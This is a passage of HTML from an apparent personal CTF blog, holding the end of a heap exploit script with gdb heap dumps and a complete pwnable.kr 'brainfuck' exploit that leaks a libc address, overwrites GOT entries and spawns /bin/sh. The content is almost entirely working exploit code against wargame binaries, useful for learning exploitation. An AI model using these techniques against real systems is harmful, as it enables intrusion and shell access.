class="number">1</span>)</span><br><span class="line"></span><br><span class="line">free_got = <span class="number">0x0804a29c</span></span><br><span class="line">payload2  = <span class="string">''</span></span><br><span class="line">payload2 += l32(<span class="number">3</span>)</span><br><span class="line">payload2 += l32(<span class="number">1</span>) + l32(<span class="number">4</span>) + l32(bin_sh)</span><br><span class="line">payload2 += l32(<span class="number">1</span>) + l32(<span class="number">4</span>) + l32(free_got)</span><br><span class="line">payload2 += <span class="string">'C'</span>*(len(payload)-len(payload2))</span><br><span class="line">Edit_Note(<span class="number">0</span>,payload2)</span><br><span class="line"><span class="comment">#List_Note()</span></span><br><span class="line">Edit_Note(<span class="number">1</span>,l32(system))</span><br><span class="line"><span class="comment">#List_Note()</span></span><br><span class="line">Delete_Note(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">io.interact()</span><br></pre></td></tr></table></figure>
<figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ x/<span class="number">20w</span>x <span class="number">0</span>x96cf000</span><br><span class="line"><span class="number">0</span>x96cf000:	<span class="number">0x00000000</span>	<span class="number">0x00000c19</span>	<span class="number">0x00000100</span>	<span class="number">0x00000003</span></span><br><span class="line"><span class="number">0</span>x96cf010:	<span class="number">0x00000001</span>	<span class="number">0x00000080</span>	<span class="number">0</span>x096cfc20	<span class="number">0x00000001</span></span><br><span class="line"><span class="number">0</span>x96cf020:	<span class="number">0x00000080</span>	<span class="number">0</span>x096cfca8	<span class="number">0x00000001</span>	<span class="number">0x00000080</span></span><br><span class="line"><span class="number">0</span>x96cf030:	<span class="number">0</span>x096cfd30	<span class="number">0x00000000</span>	<span class="number">0x00000000</span>	<span class="number">0</span>x096cfdb8</span><br><span class="line"></span><br><span class="line">gdb-peda$ x/<span class="number">110w</span>x <span class="number">0</span>x96cfc18</span><br><span class="line"><span class="number">0</span>x96cfc18:	<span class="number">0x00000000</span>	<span class="number">0x00000089</span>	<span class="number">0x41414141</span>	<span class="number">0x41414141</span></span><br><span class="line"><span class="number">0</span>x96cfc28:	<span class="number">0x41414141</span>	<span class="number">0x41414141</span>	<span class="number">0x41414141</span>	<span class="number">0x41414141</span></span><br><span class="line"><span class="number">0</span>x96cfc38:	<span class="number">0x41414141</span>	<span class="number">0x41414141</span>	<span class="number">0x41414141</span>	<span class="number">0x41414141</span></span><br><span class="line"><span class="number">0</span>x96cfc48:	<span class="number">0x41414141</span>	<span class="number">0x41414141</span>	<span class="number">0x41414141</span>	<span class="number">0x41414141</span></span><br><span class="line"><span class="number">0</span>x96cfc58:	<span class="number">0x41414141</span>	<span class="number">0x41414141</span>	<span class="number">0x41414141</span>	<span class="number">0x41414141</span></span><br><span class="line"><span class="number">0</span>x96cfc68:	<span class="number">0x41414141</span>	<span class="number">0x41414141</span>	<span class="number">0x41414141</span>	<span class="number">0x41414141</span></span><br><span class="line"><span class="number">0</span>x96cfc78:	<span class="number">0x41414141</span>	<span class="number">0x41414141</span>	<span class="number">0x41414141</span>	<span class="number">0x41414141</span></span><br><span class="line"><span class="number">0</span>x96cfc88:	<span class="number">0x41414141</span>	<span class="number">0x41414141</span>	<span class="number">0x41414141</span>	<span class="number">0x41414141</span></span><br><span class="line"><span class="number">0</span>x96cfc98:	<span class="number">0x41414141</span>	<span class="number">0x41414141</span>	<span class="number">0x00000088</span>	<span class="number">0x00000089</span></span><br><span class="line"><span class="number">0</span>x96cfca8:	<span class="number">0x42424242</span>	<span class="number">0x42424242</span>	<span class="number">0x42424242</span>	<span class="number">0x42424242</span></span><br><span class="line"><span class="number">0</span>x96cfcb8:	<span class="number">0x42424242</span>	<span class="number">0x42424242</span>	<span class="number">0x42424242</span>	<span class="number">0x42424242</span></span><br><span class="line"><span class="number">0</span>x96cfcc8:	<span class="number">0x42424242</span>	<span class="number">0x42424242</span>	<span class="number">0x42424242</span>	<span class="number">0x42424242</span></span><br><span class="line"><span class="number">0</span>x96cfcd8:	<span class="number">0x42424242</span>	<span class="number">0x42424242</span>	<span class="number">0x42424242</span>	<span class="number">0x42424242</span></span><br><span class="line"><span class="number">0</span>x96cfce8:	<span class="number">0x42424242</span>	<span class="number">0x42424242</span>	<span class="number">0x42424242</span>	<span class="number">0x42424242</span></span><br><span class="line"><span class="number">0</span>x96cfcf8:	<span class="number">0x42424242</span>	<span class="number">0x42424242</span>	<span class="number">0x42424242</span>	<span class="number">0x42424242</span></span><br><span class="line"><span class="number">0</span>x96cfd08:	<span class="number">0x42424242</span>	<span class="number">0x42424242</span>	<span class="number">0x42424242</span>	<span class="number">0x42424242</span></span><br><span class="line"><span class="number">0</span>x96cfd18:	<span class="number">0x42424242</span>	<span class="number">0x42424242</span>	<span class="number">0x42424242</span>	<span class="number">0x42424242</span></span><br><span class="line"><span class="number">0</span>x96cfd28:	<span class="number">0x00000000</span>	<span class="number">0x00000089</span>	<span class="number">0x43434343</span>	<span class="number">0x43434343</span></span><br><span class="line"><span class="number">0</span>x96cfd38:	<span class="number">0x43434343</span>	<span class="number">0x43434343</span>	<span class="number">0x43434343</span>	<span class="number">0x43434343</span></span><br><span class="line"><span class="number">0</span>x96cfd48:	<span class="number">0x43434343</span>	<span class="number">0x43434343</span>	<span class="number">0x43434343</span>	<span class="number">0x43434343</span></span><br><span class="line"><span class="number">0</span>x96cfd58:	<span class="number">0x43434343</span>	<span class="number">0x43434343</span>	<span class="number">0x43434343</span>	<span class="number">0x43434343</span></span><br><span class="line"><span class="number">0</span>x96cfd68:	<span class="number">0x43434343</span>	<span class="number">0x43434343</span>	<span class="number">0x43434343</span>	<span class="number">0x43434343</span></span><br><span class="line"><span class="number">0</span>x96cfd78:	<span class="number">0x43434343</span>	<span class="number">0x43434343</span>	<span class="number">0x43434343</span>	<span class="number">0x43434343</span></span><br><span class="line"><span class="number">0</span>x96cfd88:	<span class="number">0x43434343</span>	<span class="number">0x43434343</span>	<span class="number">0x43434343</span>	<span class="number">0x43434343</span></span><br><span class="line"><span class="number">0</span>x96cfd98:	<span class="number">0x43434343</span>	<span class="number">0x43434343</span>	<span class="number">0x43434343</span>	<span class="number">0x43434343</span></span><br><span class="line"><span class="number">0</span>x96cfda8:	<span class="number">0x43434343</span>	<span class="number">0x43434343</span>	<span class="number">0x00000198</span>	<span class="number">0x00020251</span></span><br><span class="line"></span><br><span class="line">gdb-peda$ x/<span class="number">20w</span>x <span class="number">0</span>x96cf000</span><br><span class="line"><span class="number">0</span>x96cf000:	<span class="number">0x00000000</span>	<span class="number">0x00000c19</span>	<span class="number">0x00000100</span>	<span class="number">0x00000001</span></span><br><span class="line"><span class="number">0</span>x96cf010:	<span class="number">0x00000001</span>	<span class="number">0x00000180</span>	<span class="number">0</span>x096cfc20	<span class="number">0x00000000</span></span><br><span class="line"><span class="number">0</span>x96cf020:	<span class="number">0x00000000</span>	<span class="number">0</span>x096cfca8	<span class="number">0x00000000</span>	<span class="number">0x00000000</span></span><br><span class="line"><span class="number">0</span>x96cf030:	<span class="number">0</span>x096cfd30	<span class="number">0x00000000</span>	<span class="number">0x00000000</span>	<span class="number">0</span>x096cfdb8</span><br><span class="line"></span><br><span class="line">gdb-peda$ x/<span class="number">110w</span>x <span class="number">0</span>x96cfc18</span><br><span class="line"><span class="number">0</span>x96cfc18:	<span class="number">0x00000000</span>	<span class="number">0x00000189</span>	<span class="number">0x00000000</span>	<span class="number">0x00000081</span></span><br><span class="line"><span class="number">0</span>x96cfc28:	<span class="number">0</span>x096cf00c	<span class="number">0</span>x096cf010	<span class="number">0x42424242</span>	<span class="number">0x42424242</span></span><br><span class="line"><span class="number">0</span>x96cfc38:	<span class="number">0x42424242</span>	<span class="number">0x42424242</span>	<span class="number">0x42424242</span>	<span class="number">0x42424242</span></span><br><span class="line"><span class="number">0</span>x96cfc48:	<span class="number">0x42424242</span>	<span class="number">0x42424242</span>	<span class="number">0x42424242</span>	<span class="number">0x42424242</span></span><br><span class="line"><span class="number">0</span>x96cfc58:	<span class="number">0x42424242</span>	<span class="number">0x42424242</span>	<span class="number">0x42424242</span>	<span class="number">0x42424242</span></span><br><span class="line"><span class="number">0</span>x96cfc68:	<span class="number">0x42424242</span>	<span class="number">0x42424242</span>	<span class="number">0x42424242</span>	<span class="number">0x42424242</span></span><br><span class="line"><span class="number">0</span>x96cfc78:	<span class="number">0x42424242</span>	<span class="number">0x42424242</span>	<span class="number">0x42424242</span>	<span class="number">0x42424242</span></span><br><span class="line"><span class="number">0</span>x96cfc88:	<span class="number">0x42424242</span>	<span class="number">0x42424242</span>	<span class="number">0x42424242</span>	<span class="number">0x42424242</span></span><br><span class="line"><span class="number">0</span>x96cfc98:	<span class="number">0x42424242</span>	<span class="number">0x42424242</span>	<span class="number">0x00000080</span>	<span class="number">0x00000088</span></span><br><span class="line"><span class="number">0</span>x96cfca8:	<span class="number">0x42424242</span>	<span class="number">0x42424242</span>	<span class="number">0x42424242</span>	<span class="number">0x42424242</span></span><br><span class="line"><span class="number">0</span>x96cfcb8:	<span class="number">0x42424242</span>	<span class="number">0x42424242</span>	<span class="number">0x42424242</span>	<span class="number">0x42424242</span></span><br><span class="line"><span class="number">0</span>x96cfcc8:	<span class="number">0x42424242</span>	<span class="number">0x42424242</span>	<span class="number">0x42424242</span>	<span class="number">0x42424242</span></span><br><span class="line"><span class="number">0</span>x96cfcd8:	<span class="number">0x42424242</span>	<span class="number">0x42424242</span>	<span class="number">0x42424242</span>	<span class="number">0x42424242</span></span><br><span class="line"><span class="number">0</span>x96cfce8:	<span class="number">0x42424242</span>	<span class="number">0x42424242</span>	<span class="number">0x42424242</span>	<span class="number">0x42424242</span></span><br><span class="line"><span class="number">0</span>x96cfcf8:	<span class="number">0x42424242</span>	<span class="number">0x42424242</span>	<span class="number">0x42424242</span>	<span class="number">0x42424242</span></span><br><span class="line"><span class="number">0</span>x96cfd08:	<span class="number">0x42424242</span>	<span class="number">0x42424242</span>	<span class="number">0x42424242</span>	<span class="number">0x42424242</span></span><br><span class="line"><span class="number">0</span>x96cfd18:	<span class="number">0x42424242</span>	<span class="number">0x42424242</span>	<span class="number">0x42424242</span>	<span class="number">0x42424242</span></span><br><span class="line"><span class="number">0</span>x96cfd28:	<span class="number">0x00000000</span>	<span class="number">0x00000089</span>	<span class="number">0x42424242</span>	<span class="number">0x42424242</span></span><br><span class="line"><span class="number">0</span>x96cfd38:	<span class="number">0x42424242</span>	<span class="number">0x42424242</span>	<span class="number">0x42424242</span>	<span class="number">0x42424242</span></span><br><span class="line"><span class="number">0</span>x96cfd48:	<span class="number">0x42424242</span>	<span class="number">0x42424242</span>	<span class="number">0x42424242</span>	<span class="number">0x42424242</span></span><br><span class="line"><span class="number">0</span>x96cfd58:	<span class="number">0x42424242</span>	<span class="number">0x42424242</span>	<span class="number">0x42424242</span>	<span class="number">0x42424242</span></span><br><span class="line"><span class="number">0</span>x96cfd68:	<span class="number">0x42424242</span>	<span class="number">0x42424242</span>	<span class="number">0x42424242</span>	<span class="number">0x42424242</span></span><br><span class="line"><span class="number">0</span>x96cfd78:	<span class="number">0x42424242</span>	<span class="number">0x42424242</span>	<span class="number">0x42424242</span>	<span class="number">0x42424242</span></span><br><span class="line"><span class="number">0</span>x96cfd88:	<span class="number">0x42424242</span>	<span class="number">0x42424242</span>	<span class="number">0x42424242</span>	<span class="number">0x42424242</span></span><br><span class="line"><span class="number">0</span>x96cfd98:	<span class="number">0x42424242</span>	<span class="number">0x42424242</span>	<span class="number">0x43434343</span>	<span class="number">0x00020261</span></span><br><span class="line"><span class="number">0</span>x96cfda8:	<span class="number">0x43434343</span>	<span class="number">0x43434343</span>	<span class="number">0x00000198</span>	<span class="number">0x00020251</span></span><br></pre></td></tr></table></figure>
      
    </div>
    
    <div class="article-info article-info-index">
      
      
      

      
      <div class="clearfix"></div>
    </div>
    
  </div>
  
</article>







  
    <article id="post-Pwnable-kr-brainfuck" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2015/12/10/Pwnable-kr-brainfuck/" class="article-date">
  	<time datetime="2015-12-10T15:54:16.000Z" itemprop="datePublished">2015-12-10</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2015/12/10/Pwnable-kr-brainfuck/">Pwnable.kr-brainfuck</a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <blockquote>
<p>Download: <a href="http://bigtang.org/files/bf">bf</a> <a href="http://bigtang.org/files/bf_libc.so">bf_libc.so</a></p>
</blockquote>
<figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">from zio import *</span><br><span class="line"></span><br><span class="line">offset_gets   = <span class="number">0x66e50</span></span><br><span class="line">offset_fgets  = <span class="number">0x65bc0</span></span><br><span class="line">offset_system = <span class="number">0x3f250</span></span><br><span class="line">main = <span class="number">0x08048671</span></span><br><span class="line"></span><br><span class="line">target = (<span class="string">'pwnable.kr'</span>,<span class="number">9001</span>) </span><br><span class="line"><span class="built_in">io</span> = zio(target,timeout=<span class="number">100000</span>,print_read=COLORED(REPR,<span class="string">"yellow"</span>),\</span><br><span class="line">	print_write=COLORED(REPR,<span class="string">"red"</span>))</span><br><span class="line"><span class="built_in">io</span>.read_until(<span class="string">'[ ]\n'</span>)</span><br><span class="line"></span><br><span class="line">payload  = <span class="string">''</span></span><br><span class="line">payload += <span class="string">'&lt;'</span>*(<span class="number">0xa0</span><span class="number">-0x10</span>)</span><br><span class="line">payload += <span class="string">'.&gt;.&gt;.&gt;.'</span></span><br><span class="line">payload += <span class="string">'&lt;&lt;&lt;'</span></span><br><span class="line">payload += <span class="string">',&gt;,&gt;,&gt;,&gt;'</span></span><br><span class="line">payload += <span class="string">'&gt;'</span>*<span class="number">24</span></span><br><span class="line">payload += <span class="string">',&gt;,&gt;,&gt;,&gt;'</span></span><br><span class="line">payload += <span class="string">',&gt;,&gt;,&gt;,&gt;.'</span></span><br><span class="line"></span><br><span class="line">#<span class="built_in">io</span>.gdb_hint([<span class="number">0x8048655</span>])</span><br><span class="line"></span><br><span class="line"><span class="built_in">io</span>.writeline(payload)</span><br><span class="line">fgets = l32(<span class="built_in">io</span>.read(<span class="number">4</span>))</span><br><span class="line">#<span class="built_in">print</span> hex(fgets)</span><br><span class="line">system = fgets-offset_fgets+offset_system</span><br><span class="line">gets   = fgets-offset_fgets+offset_gets</span><br><span class="line"></span><br><span class="line"><span class="built_in">io</span>.write(l32(system))</span><br><span class="line"><span class="built_in">io</span>.write(l32(gets))</span><br><span class="line"><span class="built_in">io</span>.write(l32(main))</span><br><span class="line"><span class="built_in">io</span>.writeline(<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line"><span class="built_in">io</span>.interact()</span><br></pre></td></tr></table></figure>
      
    </div>
    
    <div class="article-info article-info-index">
      
      
	<div class="article-tag tagcloud">
		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pwn/">pwn</a></li></ul>
	</div>

      

      
      <div class="clearfix"></div>
    </div>
    
  </div>
  
</article>







  
  
    <nav id="page-nav">
      <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><a class="page-number" href="/page/4/">4</a><a class="extend next" rel="next" href="/page/2/">Next &raquo;</a>
    </nav>
  
</div>
      <footer id="footer">
  <div class="outer">
    <div id="footer-info">
    	<div class="footer-left">
    		&copy; 2016 b1gtang
    	</div>
      	<div class="footer-right">
      		<a href="http://hexo.io/" target="_blank">Hexo</a>  Theme <a href="https://github.com/litten/hexo-theme-yilia" target="_blank">Yilia</a> by Litten
      	</div>
    </div>
  </div>
</footer>
    </div>
    
  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">


<script>
	var yiliaConfig = {
		fancybox: true,
		mathjax: true,
		animate: true,
		isHome: true,
		isPost: false,
		isArchive: false,
		isTag: false,
		isCategory: false,
		open_in_new: false
	}
</script>
<script src="http://7.url.cn/edu/jslib/comb/require-2.1.6,jquery-1.9.1.min.js"></script>
<script src="/js/main.js"></script>






<script type="text/x-mathjax-config">
MathJax.Hub.Config({
    tex2jax: {
        inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
        processEscapes: true,
        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
    }
});

MathJax.Hub.Queue(function() {
    var all = MathJax.Hub.getAllJax(), i;
    for(i=0; i < all.length; i += 1) {
        all[i].SourceElement().parentNode.className += ' has-jax';                 
    }       
});
</script>

<script type="text/javascript" src="http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
</script>


  </div>
</body>
</html>